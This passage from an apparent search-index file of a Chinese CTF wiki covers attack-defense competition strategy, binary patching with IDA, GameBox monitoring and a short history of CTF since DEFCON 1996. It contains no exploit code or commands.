\u4ea4\u4e92\u65f6\u5219\u9700\u8981\u8fde\u63a5\u5230\u5bf9\u5e94\u7684\u7f51\u6bb5\u91cc\u4e0e\u6f0f\u6d1e\u7a0b\u5e8f\u8fdb\u884c\u4ea4\u4e92\u3002\u63d0\u4ea4 flag \u5219\u9700\u8981\u5230\u6307\u5b9a\u7684\u7b54\u9898\u5e73\u53f0\u4e0a\u63d0\u4ea4\u3002 Warning \u8fd9\u91cc\u5c24\u5176\u9700\u8981\u6ce8\u610f\u7684\u5c31\u662f\u7aef\u53e3\u3002\u5982\u679c\u7aef\u53e3\u5728\u4e0d\u8f7b\u6613\u95f4\u5f04\u9519\u7684\u8bdd\uff0c\u8fd9\u6837\u7684\u9519\u8bef\u662f\u633a\u96be\u5bdf\u89c9\u5230\u7684\uff0c\u800c\u8fd9\u6837\u7684\u5931\u8bef\u4e5f\u4f1a\u5e26\u6765\u4e0d\u5fc5\u8981\u7684\u635f\u5931\u3002\u751a\u81f3\u4f1a\u51fa\u73b0\u957f\u65f6\u95f4\u65e0\u6cd5\u63d0\u4ea4 flag \u7684\u81f4\u547d\u60c5\u51b5\u3002\u6240\u4ee5\u9700\u8981\u5c0f\u5fc3\u6ce8\u610f\u3002 \u670d\u52a1 patch \u4e0e\u9632\u5fa1 \u00b6 \u7a0b\u5e8f patch \u8981\u5408\u7406\uff0c\u7b26\u5408\u88c1\u5224\u7cfb\u7edf check \u6761\u4ef6\u3002\u867d\u7136\u7cfb\u7edf\u7684 check \u662f check \u54ea\u91cc\u5e76\u672a\u516c\u5f00\uff0c\u4f46\u662f\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u7cfb\u7edf\u662f\u4e0d\u4f1a\u8fc7\u5ea6\u4e3a\u96be\u7684\u3002 \u7a0b\u5e8f patch \u4f7f\u7528 IDA \u8fdb\u884c\u4fee\u6539\uff0cIDA \u63d0\u4f9b\u4e86\u4e09\u79cd\u65b9\u5f0f\u7684 patch\uff1abyte\uff0cword\uff0cassemble.\u5176\u4e2d\u5b57\u8282\u7801\u4fee\u6539\u6bd4\u8f83\u597d\u7528\u3002\u56e0\u4e3a\u9010\u5b57\u8282\u4fee\u6539\u4e0d\u9700\u8003\u8651\u6c47\u7f16\u6307\u4ee4\uff0c\u4e00\u822c\u8fd9\u6837\u7684\u4fee\u6539\u6539\u52a8\u4e5f\u5f88\u5c0f\uff0c\u5728\u4e00\u5b9a\u573a\u5408\u4e0b\u5341\u5206\u597d\u7528\u3002\u6c47\u7f16\u6307\u4ee4\u7ea7\u522b\u7684\u4fee\u6539\u867d\u7136\u65b9\u4fbf\u4e0d\u9700\u8981\u4fee\u6539\u5b57\u8282\u7801\uff0c\u4f46\u662f\u4e5f\u9020\u6210\u4e86\u4e00\u5b9a\u7684\u4e0d\u4fbf\u3002\u6bd4\u5982\u9700\u8981\u989d\u5916\u8003\u8651\u6c47\u7f16\u6307\u4ee4\u7684\u957f\u5ea6\uff0c\u7ed3\u6784\u662f\u5426\u5408\u7406\u5b8c\u6574\uff0c\u903b\u8f91\u662f\u5426\u548c\u539f\u6765\u4e00\u6837\uff0c\u4fee\u6539\u7684\u6c47\u7f16\u6307\u4ee4\u662f\u5426\u5408\u6cd5\u7b49\u95ee\u9898\u3002 \u5728 patch \u7a0b\u5e8f\u65f6\u8981\u8bb0\u5f97\u5907\u4efd\u539f\u6765\u7684\u6f0f\u6d1e\u7a0b\u5e8f\uff0c\u4ee5\u4f9b\u961f\u4f0d\u5206\u6790\u4f7f\u7528\u3002\u5728\u4e0a\u4f20 patch \u7684\u65f6\u5019\u5e94\u8be5\u5148\u5220\u9664\u539f\u6765\u7684\u6f0f\u6d1e\u7a0b\u5e8f\uff0c\u7136\u540e\u5c06 patch \u8fc7\u7684\u7a0b\u5e8f\u590d\u5236\u8fdb\u53bb\uff0c\u590d\u5236\u8fdb\u53bb\u4e4b\u540e\u8fd8\u9700\u8981\u7ed9\u7a0b\u5e8f\u8d4b\u4e88\u76f8\u5e94\u7684\u6743\u9650\u3002 \u4e00\u822c\u6bd4\u8d5b\u4e2d\uff0c\u6f0f\u6d1e\u7a0b\u5e8f\u4f1a\u6709\u5341\u51e0\u5904\u9700\u8981 patch \u7684\u5730\u65b9\u3002Patch \u7684\u65f6\u5019\u4e0d\u4ec5\u8981\u8bb2\u7a76\u6709\u6548\u5408\u7406\uff0c\u8fd8\u8981\u6ee1\u8db3\u80fd\u591f\u5728\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u9632\u8303\u6216\u6df7\u6dc6\u5bf9\u624b\u7684\u5206\u6790\u3002 \u6784\u9020\u811a\u672c\u6846\u67b6\u5feb\u901f\u5c55\u5f00\u653b\u51fb \u00b6 \u5728\u653b\u9632\u6bd4\u8d5b\u8fc7\u7a0b\u4e2d\uff0c\u4e00\u8840\u663e\u5f97\u5c24\u5176\u91cd\u8981\u3002\u56e0\u6b64\u6709\u4e00\u4e2a\u653b\u51fb\u811a\u672c\u6846\u67b6\u662f\u975e\u5e38\u6709\u5229\u7684\u3002\u5feb\u901f\u5f00\u53d1\u653b\u51fb\u811a\u672c\uff0c\u53ef\u4ee5\u5728\u524d\u671f\u4fdd\u6301\u4f18\u52bf\u5730\u4f4d\uff0c\u4e5f\u53ef\u4ee5\u5728\u4e0d\u65ad\u62ff\u5206\u7684\u540c\u65f6\u7701\u4e0b\u65f6\u95f4\u53bb\u505a\u597d\u9632\u5fa1\u3002 \u6bd4\u8d5b\u7684\u4e00\u4e9b\u7b56\u7565 \u00b6 \u5728\u6bd4\u8d5b\u8fc7\u7a0b\u4e2d\uff0c\u4e0d\u5b9c\u6b7b\u8017\u5728\u4e00\u9053\u9898\u4e0a\uff0c\u7531\u4e8e\u4e00\u8840\u7684\u4f18\u52bf\u6027\uff0c\u5728\u6bd4\u8d5b\u8fc7\u7a0b\u4e2d\u66f4\u5e94\u8be5\u5168\u9762\u4e86\u89e3\u8d5b\u9898\u96be\u5ea6\uff0c\u5148\u4ece \u7b80\u5355\u9898 \u5f00\u59cb\u8fdb\u884c\u5206\u6790\uff0c\u6b65\u6b65\u4e3a\u8425\u3002 \u6bd4\u8d5b\u8fc7\u7a0b\u4e2d\uff0c\u4e24\u6781\u4f1a\u4e25\u91cd\u5206\u5316\u3002\u5e94\u8be5\u7740\u529b\u6253\u51fb\u548c\u81ea\u5df1\u5b9e\u529b\u76f8\u5f53\u548c\u6bd4\u81ea\u5df1\u961f\u4f0d\u66f4\u5f3a\u7684\u961f\u4f0d\uff0c\u5c24\u5176\u662f\u5206\u6570\u76f8\u5dee\u65e0\u51e0\u7684\u60c5\u51b5\u4e0b\uff0c\u66f4\u8981\u4e25\u9632\u4e25\u5b88\u3002 \u6bd4\u8d5b\u4e2d NPC \u4f1a\u4e0d\u5b9a\u65f6\u53d1\u51fa\u653b\u51fb\u6d41\u91cf\u3002\u4ece\u653b\u51fb\u6d41\u91cf\u4e2d\u53ef\u4ee5\u5f97\u5230 payload\u3002 \u4e00\u5b9a\u8981\u628a NPC \u5f80\u6b7b\u91cc\u6253\u3002 \u5728\u5f00\u8d5b\u521d\u53ef\u4ee5\u5c06\u6240\u6709\u7684\u7ba1\u7406\u5bc6\u7801\u90fd\u8bbe\u7f6e\u4e3a\u540c\u4e00\u4e2a\u5bc6\u7801\uff0c\u8fd9\u6837\u65b9\u4fbf\u961f\u5458\u767b\u5f55\u7ba1\u7406\u3002\u5728\u521d\u671f\u5c06\u6240\u6709\u6587\u4ef6\u5907\u4efd\u4e0b\u6765\u4f9b\u961f\u5185\u5206\u4eab\u3002","title":"Experience"},{"location":"introduction/experience/#gamebox","text":"\u6bd4\u8d5b\u4e2d\u53ef\u4ee5\u67e5\u770b\u5df1\u65b9\u548c\u654c\u65b9 GameBox \u72b6\u6001\u3002\u65f6\u523b\u5173\u6ce8\u53ef\u4ee5\u5c3d\u65e9\u83b7\u53d6\u6bd4\u8d5b\u4fe1\u606f\uff0c\u6839\u636e\u4fe1\u606f\u505a\u51fa\u8c03\u6574\u3002 \u5bf9\u4e8e\u5df1\u65b9 GameBox\uff0c\u6709\u5b58\u5728\u5982\u4e0b\u539f\u56e0\u9020\u6210 GameBox \u88ab down \u6389\uff1a \u4e3b\u529e\u65b9\u88c1\u5224\u7cfb\u7edf\u5b58\u5728\u5931\u8bef\uff0c\u8bef\u5224 GameBox \u4e3a\u4e0d\u53ef\u7528\u72b6\u6001\u3002\u8fd9\u79cd\u60c5\u51b5\u4e00\u822c\u5728\u6bd4\u8d5b\u5f00\u59cb\u524d\u53ef\u4ee5\u53d1\u73b0\uff0c\u5982\u679c\u53d1\u73b0\u5b58\u5728\u8fd9\u79cd\u60c5\u51b5\uff0c\u8981\u5c3d\u65e9\u5411\u5de5\u4f5c\u4eba\u5458\u793a\u610f\u5904\u7406\u4ee5\u51cf\u5c11\u635f\u5931\u3002 \u7a0b\u5e8f patch \u5931\u8bef\u5bfc\u81f4\u670d\u52a1\u4e0d\u53ef\u7528\u3002\u5728\u7a0b\u5e8f patch \u5b8c\u4e4b\u540e\u8981\u8fdb\u5165\u4e0b\u4e00\u8f6e\u5173\u6ce8 GameBox \u72b6\u6001\uff0c\u5982\u679c patch \u5931\u8bef\u5bfc\u81f4\u4e0d\u53ef\u7528\uff0c\u9700\u8981\u53ca\u65f6\u633d\u6551\u3002\u4f46\u662f\u4e5f\u4e0d\u8981\u8fc7\u5ea6\u62c5\u5fc3\u628a\u539f\u6765\u7684\u672a\u4fee\u8865\u8fc7\u7684\u6f0f\u6d1e\u7a0b\u5e8f\u6362\u56de\u53bb\u3002\u56e0\u4e3a down \u6389\u662f\u6240\u6709\u961f\u5e73\u5206\u5f97\u5f88\u5c11\u7684\u5206\uff0c\u800c\u76f4\u63a5\u4e0a\u6f0f\u6d1e\u7a0b\u5e8f\u4f1a\u4f7f\u7684\u5f3a\u52bf\u7684\u961f\u4f0d\u76f4\u63a5\u5229\u7528\u5f97\u5230\u5f88\u9ad8\u7684\u5f97\u5206\u3002\u6240\u4ee5\u8981\u4f9d\u636e\u5177\u4f53\u60c5\u51b5\u5bf9\u5f85\u3002 \u5bf9\u624b\u4e0d\u6b63\u5f53\u653b\u51fb\u5bfc\u81f4 GameBox \u4e0d\u53ef\u7528\u3002\u5982\u679c\u53d1\u73b0\uff0c\u9700\u8981\u53ca\u65f6\u8865\u6551\u3002 \u4e3b\u529e\u65b9\u52a0\u5f3a\u7a0b\u5e8f check\u3002\u8fd9\u79cd\u60c5\u51b5\u4e3b\u529e\u65b9\u4f1a\u5bf9\u6240\u6709\u961f\u5458\u8fdb\u884c\u901a\u77e5\u516c\u544a\u3002\u5728 GameBox \u72b6\u6001\u5899\u4e0a\u7684\u72b6\u6001\u4f1a\u663e\u793a\u8be5\u9898\u7684\u5404\u961f GameBox \u5927\u9762\u79ef\u4e0d\u53ef\u7528\u3002 \u5bf9\u4e8e\u654c\u65b9 GameBox\u3002\u6211\u4eec\u53ef\u4ee5\u83b7\u53d6\u4ee5\u4e0b\u4fe1\u606f\u3002 \u6839\u636e\u653b\u51fb\u6d41\u89c2\u6d4b\u54ea\u4e9b\u961f\u4f0d\u7684 GameBox \u6ca1\u6709\u9632\u5fa1\u6210\u529f\u3002\u9488\u5bf9\u8fd9\u4e9b\u961f\u4f0d\u53ef\u4ee5\u66f4\u591a\u5730\u5b9e\u73b0\u653b\u51fb \u6709\u961f\u4f0d\u62ff\u51fa\u4e00\u8840\u65f6\u3002\u53ef\u4ee5\u6839\u636e\u5404\u961f GameBox \u72b6\u6001\u63a8\u65ad\u51fa\u4e00\u8840\u961f\u4f0d\u662f\u5426\u5df2\u7ecf\u5199\u51fa\u5229\u7528\u811a\u672c\u3002\u5199\u51fa\u5229\u7528\u811a\u672c\u540e\u53ef\u4ee5\u89c2\u6d4b\u5df1\u65b9\u662f\u5426\u505a\u597d\u4e86\u9632\u5fa1\u3002","title":"\u5173\u6ce8 Gamebox \u72b6\u6001"},{"location":"introduction/experience/#_1","text":"\u6bd4\u8d5b\u8fc7\u7a0b\u4e2d\u4f1a\u4e3b\u529e\u65b9\u4f1a\u5b89\u6392\u597d\u5408\u7406\u7684\u7f51\u6bb5\u5206\u5e03\u3002 \u7ef4\u62a4\u7684\u65f6\u5019\u9700\u8981\u8fde\u63a5\u5230\u672c\u961f GameBox \u6240\u5728\u7f51\u6bb5\u4e0a\uff0c\u6839\u636e\u4e3b\u529e\u65b9\u63d0\u4f9b\u7684 CTF \u8d26\u53f7\u4e0e\u5bc6\u7801\u767b\u5f55\u3002\u800c\u4e0e\u5176\u4ed6\u961f\u4f0d\u7684 GameBox \u4ea4\u4e92\u65f6\u5219\u9700\u8981\u8fde\u63a5\u5230\u5bf9\u5e94\u7684\u7f51\u6bb5\u91cc\u4e0e\u6f0f\u6d1e\u7a0b\u5e8f\u8fdb\u884c\u4ea4\u4e92\u3002\u63d0\u4ea4 flag \u5219\u9700\u8981\u5230\u6307\u5b9a\u7684\u7b54\u9898\u5e73\u53f0\u4e0a\u63d0\u4ea4\u3002 Warning \u8fd9\u91cc\u5c24\u5176\u9700\u8981\u6ce8\u610f\u7684\u5c31\u662f\u7aef\u53e3\u3002\u5982\u679c\u7aef\u53e3\u5728\u4e0d\u8f7b\u6613\u95f4\u5f04\u9519\u7684\u8bdd\uff0c\u8fd9\u6837\u7684\u9519\u8bef\u662f\u633a\u96be\u5bdf\u89c9\u5230\u7684\uff0c\u800c\u8fd9\u6837\u7684\u5931\u8bef\u4e5f\u4f1a\u5e26\u6765\u4e0d\u5fc5\u8981\u7684\u635f\u5931\u3002\u751a\u81f3\u4f1a\u51fa\u73b0\u957f\u65f6\u95f4\u65e0\u6cd5\u63d0\u4ea4 flag \u7684\u81f4\u547d\u60c5\u51b5\u3002\u6240\u4ee5\u9700\u8981\u5c0f\u5fc3\u6ce8\u610f\u3002","title":"\u5206\u6e05\u533a\u6bb5\u4e0e\u7aef\u53e3"},{"location":"introduction/experience/#patch","text":"\u7a0b\u5e8f patch \u8981\u5408\u7406\uff0c\u7b26\u5408\u88c1\u5224\u7cfb\u7edf check \u6761\u4ef6\u3002\u867d\u7136\u7cfb\u7edf\u7684 check \u662f check \u54ea\u91cc\u5e76\u672a\u516c\u5f00\uff0c\u4f46\u662f\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u7cfb\u7edf\u662f\u4e0d\u4f1a\u8fc7\u5ea6\u4e3a\u96be\u7684\u3002 \u7a0b\u5e8f patch \u4f7f\u7528 IDA \u8fdb\u884c\u4fee\u6539\uff0cIDA \u63d0\u4f9b\u4e86\u4e09\u79cd\u65b9\u5f0f\u7684 patch\uff1abyte\uff0cword\uff0cassemble.\u5176\u4e2d\u5b57\u8282\u7801\u4fee\u6539\u6bd4\u8f83\u597d\u7528\u3002\u56e0\u4e3a\u9010\u5b57\u8282\u4fee\u6539\u4e0d\u9700\u8003\u8651\u6c47\u7f16\u6307\u4ee4\uff0c\u4e00\u822c\u8fd9\u6837\u7684\u4fee\u6539\u6539\u52a8\u4e5f\u5f88\u5c0f\uff0c\u5728\u4e00\u5b9a\u573a\u5408\u4e0b\u5341\u5206\u597d\u7528\u3002\u6c47\u7f16\u6307\u4ee4\u7ea7\u522b\u7684\u4fee\u6539\u867d\u7136\u65b9\u4fbf\u4e0d\u9700\u8981\u4fee\u6539\u5b57\u8282\u7801\uff0c\u4f46\u662f\u4e5f\u9020\u6210\u4e86\u4e00\u5b9a\u7684\u4e0d\u4fbf\u3002\u6bd4\u5982\u9700\u8981\u989d\u5916\u8003\u8651\u6c47\u7f16\u6307\u4ee4\u7684\u957f\u5ea6\uff0c\u7ed3\u6784\u662f\u5426\u5408\u7406\u5b8c\u6574\uff0c\u903b\u8f91\u662f\u5426\u548c\u539f\u6765\u4e00\u6837\uff0c\u4fee\u6539\u7684\u6c47\u7f16\u6307\u4ee4\u662f\u5426\u5408\u6cd5\u7b49\u95ee\u9898\u3002 \u5728 patch \u7a0b\u5e8f\u65f6\u8981\u8bb0\u5f97\u5907\u4efd\u539f\u6765\u7684\u6f0f\u6d1e\u7a0b\u5e8f\uff0c\u4ee5\u4f9b\u961f\u4f0d\u5206\u6790\u4f7f\u7528\u3002\u5728\u4e0a\u4f20 patch \u7684\u65f6\u5019\u5e94\u8be5\u5148\u5220\u9664\u539f\u6765\u7684\u6f0f\u6d1e\u7a0b\u5e8f\uff0c\u7136\u540e\u5c06 patch \u8fc7\u7684\u7a0b\u5e8f\u590d\u5236\u8fdb\u53bb\uff0c\u590d\u5236\u8fdb\u53bb\u4e4b\u540e\u8fd8\u9700\u8981\u7ed9\u7a0b\u5e8f\u8d4b\u4e88\u76f8\u5e94\u7684\u6743\u9650\u3002 \u4e00\u822c\u6bd4\u8d5b\u4e2d\uff0c\u6f0f\u6d1e\u7a0b\u5e8f\u4f1a\u6709\u5341\u51e0\u5904\u9700\u8981 patch \u7684\u5730\u65b9\u3002Patch \u7684\u65f6\u5019\u4e0d\u4ec5\u8981\u8bb2\u7a76\u6709\u6548\u5408\u7406\uff0c\u8fd8\u8981\u6ee1\u8db3\u80fd\u591f\u5728\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u9632\u8303\u6216\u6df7\u6dc6\u5bf9\u624b\u7684\u5206\u6790\u3002","title":"\u670d\u52a1 patch \u4e0e\u9632\u5fa1"},{"location":"introduction/experience/#_2","text":"\u5728\u653b\u9632\u6bd4\u8d5b\u8fc7\u7a0b\u4e2d\uff0c\u4e00\u8840\u663e\u5f97\u5c24\u5176\u91cd\u8981\u3002\u56e0\u6b64\u6709\u4e00\u4e2a\u653b\u51fb\u811a\u672c\u6846\u67b6\u662f\u975e\u5e38\u6709\u5229\u7684\u3002\u5feb\u901f\u5f00\u53d1\u653b\u51fb\u811a\u672c\uff0c\u53ef\u4ee5\u5728\u524d\u671f\u4fdd\u6301\u4f18\u52bf\u5730\u4f4d\uff0c\u4e5f\u53ef\u4ee5\u5728\u4e0d\u65ad\u62ff\u5206\u7684\u540c\u65f6\u7701\u4e0b\u65f6\u95f4\u53bb\u505a\u597d\u9632\u5fa1\u3002","title":"\u6784\u9020\u811a\u672c\u6846\u67b6\u5feb\u901f\u5c55\u5f00\u653b\u51fb"},{"location":"introduction/experience/#_3","text":"\u5728\u6bd4\u8d5b\u8fc7\u7a0b\u4e2d\uff0c\u4e0d\u5b9c\u6b7b\u8017\u5728\u4e00\u9053\u9898\u4e0a\uff0c\u7531\u4e8e\u4e00\u8840\u7684\u4f18\u52bf\u6027\uff0c\u5728\u6bd4\u8d5b\u8fc7\u7a0b\u4e2d\u66f4\u5e94\u8be5\u5168\u9762\u4e86\u89e3\u8d5b\u9898\u96be\u5ea6\uff0c\u5148\u4ece \u7b80\u5355\u9898 \u5f00\u59cb\u8fdb\u884c\u5206\u6790\uff0c\u6b65\u6b65\u4e3a\u8425\u3002 \u6bd4\u8d5b\u8fc7\u7a0b\u4e2d\uff0c\u4e24\u6781\u4f1a\u4e25\u91cd\u5206\u5316\u3002\u5e94\u8be5\u7740\u529b\u6253\u51fb\u548c\u81ea\u5df1\u5b9e\u529b\u76f8\u5f53\u548c\u6bd4\u81ea\u5df1\u961f\u4f0d\u66f4\u5f3a\u7684\u961f\u4f0d\uff0c\u5c24\u5176\u662f\u5206\u6570\u76f8\u5dee\u65e0\u51e0\u7684\u60c5\u51b5\u4e0b\uff0c\u66f4\u8981\u4e25\u9632\u4e25\u5b88\u3002 \u6bd4\u8d5b\u4e2d NPC \u4f1a\u4e0d\u5b9a\u65f6\u53d1\u51fa\u653b\u51fb\u6d41\u91cf\u3002\u4ece\u653b\u51fb\u6d41\u91cf\u4e2d\u53ef\u4ee5\u5f97\u5230 payload\u3002 \u4e00\u5b9a\u8981\u628a NPC \u5f80\u6b7b\u91cc\u6253\u3002 \u5728\u5f00\u8d5b\u521d\u53ef\u4ee5\u5c06\u6240\u6709\u7684\u7ba1\u7406\u5bc6\u7801\u90fd\u8bbe\u7f6e\u4e3a\u540c\u4e00\u4e2a\u5bc6\u7801\uff0c\u8fd9\u6837\u65b9\u4fbf\u961f\u5458\u767b\u5f55\u7ba1\u7406\u3002\u5728\u521d\u671f\u5c06\u6240\u6709\u6587\u4ef6\u5907\u4efd\u4e0b\u6765\u4f9b\u961f\u5185\u5206\u4eab\u3002","title":"\u6bd4\u8d5b\u7684\u4e00\u4e9b\u7b56\u7565"},{"location":"introduction/history/","text":"\u672c\u680f\u5185\u5bb9\u6458\u81ea\u8bf8\u845b\u5efa\u4f1f\u8001\u5e08\u5728 i \u6625\u79cb\u4e0a\u7684\u516c\u5f00\u89c6\u9891\u300cCTF \u7684\u8fc7\u53bb\u3001\u73b0\u5728\u4e0e\u672a\u6765\u300d\u3002 CTF \u7684\u8d77\u6e90 \u00b6 CTF \u7684\u524d\u8eab\u662f\u4f20\u7edf\u9ed1\u5ba2\u4e4b\u95f4\u7f51\u7edc\u6280\u672f\u6bd4\u62fc\u7684\u6e38\u620f\uff0c\u8d77\u6e90\u4e8e 1996 \u5e74\u7b2c\u56db\u5c4a DEFCON\u3002 \u65e9\u671f CTF \u7ade\u8d5b \u00b6 \u6700\u5f00\u59cb\u7684 CTF \u6bd4\u8d5b\uff081996 \u5e74-2001 \u5e74\uff09\uff0c\u6ca1\u6709\u660e\u786e\u7684\u6bd4\u8d5b\u89c4\u5219\uff0c\u6ca1\u6709\u4e13\u4e1a\u642d\u5efa\u7684\u6bd4\u8d5b\u5e73\u53f0\u4e0e\u73af\u5883\u3002\u7531\u53c2\u6570\u961f\u4f0d\u5404\u81ea\u51c6\u5907\u6bd4\u8d5b\u76ee\u6807\uff08\u81ea\u5df1\u51c6\u5907\u7684\u6bd4\u8d5b\u76ee\u6807\u81ea\u5df1\u9632\u5b88\u5e76\u8981\u5c1d\u8bd5\u653b\u7834\u5bf9\u65b9\u63d0\u4f9b\u7684\u6bd4\u8d5b\u76ee\u6807\uff09\u3002\u800c\u7ec4\u7ec7\u8005\u5927\u90fd\u53ea\u662f\u4e00\u4e9b\u975e\u4e13\u4e1a\u7684\u5fd7\u613f\u8005\uff0c\u63a5\u53d7\u53c2\u8d5b\u961f\u4f0d\u8bf7\u6c42\u624b\u5de5\u8ba1\u5206\u3002 \u6ca1\u6709\u540e\u53f0\u81ea\u52a8\u7cfb\u7edf\u652f\u6301\u548c\u88c1\u5224\u6280\u672f\u80fd\u529b\u8ba4\u5b9a\uff0c\u8ba1\u5206\u5ef6\u8fdf\u548c\u8bef\u5dee\u4ee5\u53ca\u4e0d\u53ef\u9760\u7684\u7f51\u7edc\u548c\u4e0d\u5f53\u7684\u914d\u7f6e\uff0c\u5bfc\u81f4\u6bd4\u8d5b\u5e26\u6765\u4e86\u6781\u5927\u7684\u4e89\u8bba\u4e0e\u4e0d\u6ee1\u3002 \u300c\u73b0\u4ee3\u300dCTF \u7ade\u8d5b \u00b6 \u7531\u4e13\u4e1a\u961f\u4f0d\u627f\u62c5\u6bd4\u8d5b\u5e73\u53f0\u3001\u547d\u9898\u3001\u8d5b\u4e8b\u7ec4\u7ec7\u4ee5\u53ca\u81ea\u52a8\u5316\u79ef\u5206\u7cfb\u7edf\u3002\u53c2\u8d5b\u961f\u4f0d\u9700\u63d0\u4ea4\u53c2\u8d5b\u7533\u8bf7\uff0c\u7531 DEFCON \u4f1a\u8bae\u7ec4\u7ec7\u8005\u4eec\u8fdb\u884c\u8bc4\u9009\u3002 \u5c31 LegitBS \u7ec4\u7ec7\u7684\u4e09\u5e74 DEFCON CTF \u6bd4\u8d5b\u800c\u8a00\uff0c\u6709\u4ee5\u4e0b\u7a81\u51fa\u7279\u70b9\uff1a \u6bd4\u8d5b\u4fa7\u91cd\u4e8e\u5bf9\u8ba1\u7b97\u673a\u5e95\u5c42\u548c\u7cfb\u7edf\u5b89\u5168\u6838\u5fc3\u80fd\u529b\uff0cWeb \u6f0f\u6d1e\u653b\u9632\u6280\u5de7\u5b8c\u5168\u4e0d\u53d7\u91cd\u89c6\u3002 \u7ade\u8d5b\u73af\u5883\u8d8b\u5411\u591a CPU \u6307\u4ee4\u67b6\u6784\u96c6\uff0c\u591a\u64cd\u4f5c\u7cfb\u7edf\uff0c\u591a\u7f16\u7a0b\u8bed\u8a00\u3002 \u91c7\u7528\u300c\u96f6\u548c\u300d\u8ba1\u5206\u89c4\u5219\u3002 \u56e2\u961f\u7efc\u5408\u80fd\u529b\u8003\u7814\uff1a\u9006\u5411\u5206\u6790\u3001\u6f0f\u6d1e\u6316\u6398\u3001\u6f0f\u6d1e\u5229\u7528\u3001\u6f0f\u6d1e\u4fee\u8865\u52a0\u56fa\u3001\u7f51\u7edc\u6d41\u91cf\u5206\u6790\u3001\u7cfb\u7edf\u5b89\u5168\u8fd0\u7ef4\u4ee5\u53ca\u9762\u5411\u5b89\u5168\u7684\u7f16\u7a0b\u8c03\u8bd5\u3002","title":"History"},{"location":"introduction/history/#ctf","text":"CTF \u7684\u524d\u8eab\u662f\u4f20\u7edf\u9ed1\u5ba2\u4e4b\u95f4\u7f51\u7edc\u6280\u672f\u6bd4\u62fc\u7684\u6e38\u620f\uff0c\u8d77\u6e90\u4e8e 1996 \u5e74\u7b2c\u56db\u5c4a DEFCON\u3002","title":"CTF \u7684\u8d77\u6e90"},{"location":"introduction/history/#ctf_1","text":"\u6700\u5f00\u59cb\u7684 CTF \u6bd4\u8d5b\uff081996 \u5e74-2001 \u5e74\uff09\uff0c\u6ca1\u6709\u660e\u786e\u7684\u6bd4\u8d5b\u89c4\u5219\uff0c\u6ca1\u6709\u4e13\u4e1a\u642d\u5efa\u7684\u6bd4\u8d5b\u5e73\u53f0\u4e0e\u73af\u5883\u3002\u7531\u53c2\u6570\u961f\u4f0d\u5404\u81ea\u51c6\u5907\u6bd4\u8d5b\u76ee\u6807\uff08\u81ea\u5df1\u51c6\u5907\u7684\u6bd4\u8d5b\u76ee\u6807\u81ea\u5df1\u9632\u5b88\u5e76\u8981\u5c1d\u8bd5\u653b\u7834\u5bf9\u65b9\u63d0\u4f9b\u7684\u6bd4\u8d5b\u76ee\u6807\uff09\u3002\u800c\u7ec4\u7ec7\u8005\u5927\u90fd\u53ea\u662f\u4e00\u4e9b\u975e\u4e13\u4e1a\u7684\u5fd7\u613f\u8005\uff0c\u63a5\u53d7\u53c2\u8d5b\u961f\u4f0d\u8bf7\u6c42\u624b\u5de5\u8ba1\u5206\u3002 \u6ca1\u6709\u540e\u53f0\u81ea\u52a8\u7cfb\u7edf\u652f\u6301\u548c\u88c1\u5224\u6280\u672f\u80fd\u529b\u8ba4\u5b9a\uff0c\u8ba1\u5206\u5ef6\u8fdf\u548c\u8bef\u5dee\u4ee5\u53ca\u4e0d\u53ef\u9760\u7684\u7f51\u7edc\u548c\u4e0d\u5f53\u7684\u914d\u7f6e\uff0c\u5bfc\u81f4\u6bd4\u8d5b\u5e26\u6765\u4e86\u6781\u5927\u7684\u4e89\u8bba\u4e0e\u4e0d\u6ee1\u3002","title":"\u65e9\u671f CTF \u7ade\u8d5b"},{"location":"introduction/history/#ctf_2","text":"\u7531\u4e13\u4e1a\u961f\u4f0d\u627f\u62c5\u6bd4\u8d5b\u5e73\u53f0\u3001\u547d\u9898\u3001\u8d5b\u4e8b\u7ec4\u7ec7\u4ee5\u53ca\u81ea\u52a8\u5316\u79ef\u5206\u7cfb\u7edf\u3002\u53c2\u8d5b\u961f\u4f0d\u9700\u63d0\u4ea4\u53c2\u8d5b\u7533\u8bf7\uff0c\u7531 DEFCON \u4f1a\u8bae\u7ec4\u7ec7\u8005\u4eec\u8fdb\u884c\u8bc4\u9009\u3002 \u5c31 LegitBS \u7ec4\u7ec7\u7684\u4e09\u5e74 DEFCON CTF \u6bd4\u8d5b\u800c\u8a00\uff0c\u6709\u4ee5\u4e0b\u7a81\u51fa\u7279\u70b9\uff1a \u6bd4\u8d5b\u4fa7\u91cd\u4e8e\u5bf9\u8ba1\u7b97\u673a\u5e95\u5c42\u548c\u7cfb\u7edf\u5b89\u5168\u6838\u5fc3\u80fd\u529b\uff0cWeb \u6f0f\u6d1e\u653b\u9632\u6280\u5de7\u5b8c\u5168\u4e0d\u53d7\u91cd\u89c6\u3002 \u7ade\u8d5b\u73af\u5883\u8d8b\u5411\u591a CPU \u6307\u4ee4\u67b6\u6784\u96c6\uff0c\u591a\u64cd\u4f5c\u7cfb\u7edf\uff0c\u591a\u7f16\u7a0b\u8bed\u8a00\u3002 \u91c7\u7528\u300c\u96f6\u548c\u300d\u8ba1\u5206\u89c4\u5219\u3002 \u56e2\u961f\u7efc\u5408\u80fd\u529b\u8003\u7814\uff1a\u9006\u5411\u5206\u6790\u3001\u6f0f\u6d1e\u6316\u6398\u3001\u6f0f\u6d1e\u5229\u7528\u3001\u6f0f\u6d1e\u4fee\u8865\u52a0\u56fa\u3001\u7f51\u7edc\u6d41\u91cf\u5206\u6790\u3001\u7cfb\u7edf\u5b89\u5168\u8fd0\u7ef4\u4ee5\u53ca\u9762\u5411\u5b89\u5168\u7684\u7f16\u7a0b\u8c03\u8bd5\u3002","title":"\u300c\u73b0\u4ee3\u300dCTF \u7ade\u8d5b"},{"location":"introduction/mode/","text":"\u89e3\u9898\u6a21\u5f0f - Jeopardy \u00b6 \u89e3\u9898\u6a21\u5f0f\uff08Jeopardy\uff09\u5e38\u89c1\u4e8e\u7ebf\u4e0a\u9009\u62d4\u6bd4\u8d5b\u3002\u5728\u89e3\u9898\u6a21\u5f0f CTF 